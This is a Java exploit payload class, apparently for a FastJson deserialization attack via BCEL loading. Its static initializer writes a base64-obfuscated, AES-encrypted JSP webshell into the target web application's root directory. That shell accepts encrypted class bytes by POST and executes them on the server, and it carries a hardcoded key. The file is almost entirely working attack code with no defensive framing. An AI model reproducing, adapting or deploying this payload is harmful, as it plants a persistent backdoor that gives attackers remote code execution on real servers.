package payloads;

import java.io.PrintWriter;
import sun.misc.BASE64Decoder;

public class FastJsonEchoBCEL {
    public FastJsonEchoBCEL() throws Exception {
    }

    public static void main(String[] args) throws Exception {
        new FastJsonEchoBCEL();
    }

    static {
        try {
            Class cls = Thread.currentThread().getContextClassLoader().loadClass("bsh.Interpreter");
            String path = cls.getProtectionDomain().getCodeSource().getLocation().getPath();
            PrintWriter printWriter2 = new PrintWriter(path.split("WEB-INF")[0] + "R4gTesttesT.txt");
            String shell = "PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmEuaW8uKixqYXZheC5jcnlwdG8uKixqYXZheC5jcnlwdG8uc3BlYy4qIiAlPjwlISBwcml2YXRlIGJ5dGVbXSBEZWNyeXB0KGJ5dGVbXSBkYXRhKSB0aHJvd3MgRXhjZXB0aW9uIHsgU3RyaW5nIGs9ImU0NWUzMjlmZWI1ZDkyNWIiOyBqYXZheC5jcnlwdG8uQ2lwaGVyIGM9amF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTL0VDQi9QS0NTNVBhZGRpbmciKTtjLmluaXQoMixuZXcgamF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTsgYnl0ZVtdIGRlY29kZWJzOyBDbGFzcyBiYXNlQ2xzIDsgdHJ5eyBiYXNlQ2xzPUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTsgT2JqZWN0IERlY29kZXI9YmFzZUNscy5nZXRNZXRob2QoImdldERlY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZUNscywgbnVsbCk7IGRlY29kZWJzPShieXRlW10pIERlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIG5ldyBDbGFzc1tde2J5dGVbXS5jbGFzc30pLmludm9rZShEZWNvZGVyLCBuZXcgT2JqZWN0W117ZGF0YX0pOyB9IGNhdGNoIChUaHJvd2FibGUgZSkgeyBTeXN0ZW0ub3V0LnByaW50bG4oIjQ0NDQ0NCIpOyBiYXNlQ2xzID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RGVjb2RlciIpOyBPYmplY3QgRGVjb2Rlcj1iYXNlQ2xzLm5ld0luc3RhbmNlKCk7IGRlY29kZWJzPShieXRlW10pIERlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsbmV3IENsYXNzW117U3RyaW5nLmNsYXNzfSkuaW52b2tlKERlY29kZXIsIG5ldyBPYmplY3RbXXtuZXcgU3RyaW5nKGRhdGEpfSk7IH0gcmV0dXJuIGMuZG9GaW5hbChkZWNvZGVicyk7IH0gJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXsgQnl0ZUFycmF5T3V0cHV0U3RyZWFtIGJvcyA9IG5ldyBCeXRlQXJyYXlPdXRwdXRTdHJlYW0oKTsgYnl0ZVtdIGJ1ZiA9IG5ldyBieXRlWzUxMl07IGludCBsZW5ndGg9cmVxdWVzdC5nZXRJbnB1dFN0cmVhbSgpLnJlYWQoYnVmKTsgd2hpbGUgKGxlbmd0aD4wKSB7IGJ5dGVbXSBkYXRhPSBBcnJheXMuY29weU9mUmFuZ2UoYnVmLDAsbGVuZ3RoKTsgYm9zLndyaXRlKGRhdGEpOyBsZW5ndGg9cmVxdWVzdC5nZXRJbnB1dFN0cmVhbSgpLnJlYWQoYnVmKTsgfSBuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhEZWNyeXB0KGJvcy50b0J5dGVBcnJheSgpKSkubmV3SW5zdGFuY2UoKS5lcXVhbHMocGFnZUNvbnRleHQpO30gJT4=";
//            String shell = "SGVsbG8gUjRnVGVzdA==";
            BASE64Decoder decoder = new BASE64Decoder();
            String decodeString = new String(decoder.decodeBuffer(shell), "UTF-8");
            printWriter2.println(decodeString);
            printWriter2.close();
        } catch (Exception var6) {
        }

    }
}